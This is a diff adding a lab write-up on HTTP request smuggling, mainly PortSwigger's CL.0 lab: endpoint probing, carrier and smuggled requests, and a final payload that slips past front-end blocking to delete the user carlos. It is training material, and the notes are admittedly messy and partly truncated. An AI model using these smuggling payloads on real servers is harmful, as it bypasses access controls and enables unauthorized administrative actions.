@@ -260,11 +260,200 @@ https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-req
 
 To solve the lab, identify a vulnerable endpoint, smuggle a request to the back-end to access to the admin panel at /admin, then delete the user carlos
 
+1. since we need POST request to play around with the Te and CL - the only vector of attack is the **POST /login HTTP/1.1** request. - lets send it to repeater
+
+2. use link of admin panel to send the request **GET /admin HTTP/1.1** to repeater
+
+3. craft a combined request:
+```
+POST /login HTTP/1.1
+Host: 0a2f00b603a96da1c04294f80075001b.web-security-academy.net
+Cookie: session=gbZvHsAytPvTQtra4ySMIIyhl7J6tcAL
+Connection: keep-alive
+Content-Length: 0
+
+GET /admin HTTP/1.1
+Host: localhost
+Cookie: session=gbZvHsAytPvTQtra4ySMIIyhl7J6tcAL
+Connection: close
+
+```
+(or use the Group Tab option)
+
+response:
+```
+HTTP/1.1 400 Bad Request
+Content-Type: application/json; charset=utf-8
+Keep-Alive: timeout=10
+Content-Length: 26
+
+"Missing parameter 'csrf'"HTTP/1.1 403 Forbidden
+Content-Type: application/json; charset=utf-8
+Connection: close
+Content-Length: 24
+
+"Path /admin is blocked"
+```
+
+changing host to "**localhost**" or "**127.0.0.1**" yields the same response as the original host header **.web-security-academy.net**
+```
+"Path /admin is blocked" 
+```
+while setting host header to **192.168.0.1** yields a different error (back-end server?): 
+```
+    <html><head><title>Client Error: Forbidden</title></head><body><h1>Client Error: Forbidden</h1></body></html>
+```
+doing a TRACE command we get rsponse revealing it is the Front-end server who blocks our path to /admin)
+www
+"Frontend only accepts methods GET, POST, HEAD"
+```
+```
+POST /post/comment HTTP/1.1
+Host: 0a2f00b603a96da1c04294f80075001b.web-security-academy.net
+Cookie: session=gbZvHsAytPvTQtra4ySMIIyhl7J6tcAL
+Connection: keep-alive
+Content-Length: 187
+
+csrf=tIBFEReW1l5UCOO0L0naEobAtmRps3Xj&postId=6&comment=test+123&name=123&email=clea@token.com&website=https://bs.com
+```
+```
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+```
 
 
 
 
-# **this is the solutions - but without the proper lab name link and explanation. sorry early work - to be updated. I am keeping work here so you might draw ideas from payload, even if it is a mess of a writeup... :) **
+```
+
+
+# **CL.0 request smuggling**
+https://portswigger.net/web-security/request-smuggling/browser/cl-0
+
+1. we start by exploring possible endpoint to exploit:
+```
+/
+/post?postId=x
+/login 
+/resources/images/x.svg
+```
+
+as lab description implies: any of those endpoints could be sitting in a different back-end server, maybe the one with vularbility, so we will check our payload on all of them.
+<!-- 
+lets change all of them to POST to make sure method is suported for the endpoint:
+```
+POST /post/comment HTTP/1.1
+POST /post?postId=8 HTTP/1.1
+POST /login HTTP/1.1
+POST /resources/images/avatarDefault.svg HTTP/1.1
+POST /resources/images/blog.svg HTTP/1.1
+``` -->
+
+lets also check the blocking mechanism by calling the delete link within the admin panel:
+```
+request:
+POST /admin/delete?username=carlos HTTP/1.1
+Host: 0ae4006204a47aebc0c9a0a2002900ef.web-security-academy.net
+
+response:
+HTTP/1.1 403 Forbidden
+..
+"Path /admin/delete is blocked"
+```
+(this is the Front-End Path-blocking us from reaching restricted areas)
+
+
+2. craft a Probe for a CL.0 (basicly a CL:TE without the TE or something similar):
+
+since we deal with back end server who ignores CL (so it will TE even without explicit order)  - we will leave the Burps **Update Content length** option checked. 
+
+for the **carrier request** we will start by striping redundent headers for clean structure:
+```
+POST / HTTP/1.1
+Host: 0ae4006204a47aebc0c9a0a2002900ef.web-security-academy.net
+Cookie: session=I60GZDQYEO0y8V8YuTucPs9FQhArLUMl
+Connection: close
+Content-Length: 0
+```
+change **Connection:** header to **keep-alive** (to support our smuggled request)
+
+(this way Front End server will get a valid CL value, that reflects full payload, and let everything through. A value that the later Back-End server will be more than happy to ignore and do his own thing. you know, TE)
+
+for the **smuggeld request** we will use the **/**:
+```
+POST / HTTP/1.
+Host: 0ae4006204a47aebc0c9a0a2002900ef.web-security-academy.net
+Cookie: session=I60GZDQYEO0y8V8YuTucPs9FQhArLUMl
+Connection: keep-alive
+Content-Length: 27
+
+POST / HTTP/1.1
+foo: x
+```
+sending the payload yields no abnormal resaults. lets try it on other endpoint:
+
+
+
+**Prob's carft:**
+```
+POST / HTTP/1.1
+Host: 0ae4006204a47aebc0c9a0a2002900ef.web-security-academy.net
+Cookie: session=I60GZDQYEO0y8V8YuTucPs9FQhArLUMl
+Connection: close
+Content-Length: 0
+
+
+POST /404finder HTTP/1.1
+foo: x
+```
+all response are 200 ok for the carrier request.
+
+lets look into other endpoint until we find the one acting strangly:
+POST /post/comment HTTP/1.1 - normal
+POST /my-account HTTP/1.1 - normal
+POST /resources/images/blog.svg HTTP/1.1 - not normal!
+```
+we obderve we get a responses for the svg resource and a "404 not found" immidiatly after. this implies the resource server is vulnerable to suggeling
+
+lets arm the prob with a "delete carlos" warhead:
+```
+POST /resources/images/blog.svg HTTP/1.1
+Host: 0ae4006204a47aebc0c9a0a2002900ef.web-security-academy.net
+Cookie: session=I60GZDQYEO0y8V8YuTucPs9FQhArLUMl
+Connection: keep-alive
+Content-Length: 54
+
+
+GET /admin/delete?username=carlos HTTP/1.1
+x: x
+
+```
+
+Victory! Carlos is deleted!
+
+
+
+
+
+
+
+
+payload:
+POST /resources/images/blog.svg HTTP/1.1
+Host: 0a5600b20333dff4c00669e0008900cf.web-security-academy.net
+Cookie: session=g7dk6M42BAlaCge5bRfY2UUbrkTgVcpx
+Connection: keep-alive
+Content-Length: 63
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+
+
+
+
+
+
+**this is the solutions - but without the proper lab name link and explanation. sorry early work - to be updated. I am keeping work here so you might draw ideas from payload, even if it is a mess of a writeup... :) **
 ==========================================================================================================
 
 
@@ -343,22 +532,7 @@ csrf=3YiinGWwJFKC23Odz76V3PtjQGjNmQLJ&postId=8&name=carlos&email=carlos%40carlo.
 POST / HTTP/1.1
 Host: acf71f8a1f345eddc0000f56001f0021.web-security-academy.net
 Cookie: session=m4e6JihcaYRcW5PC16lXj0tX8cgztgux
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Content-Type: application/x-www-form-urlencoded
 Content-Length: 250
-Origin: https://acf71f8a1f345eddc0000f56001f0021.web-security-academy.net
-Dnt: 1
-Referer: https://acf71f8a1f345eddc0000f56001f0021.web-security-academy.net/
-Upgrade-Insecure-Requests: 1
-Sec-Fetch-Dest: document
-Sec-Fetch-Mode: navigate
-Sec-Fetch-Site: same-origin
-Sec-Fetch-User: ?1
-Sec-Gpc: 1
-Te: trailers
 Connection: close
 
 search=
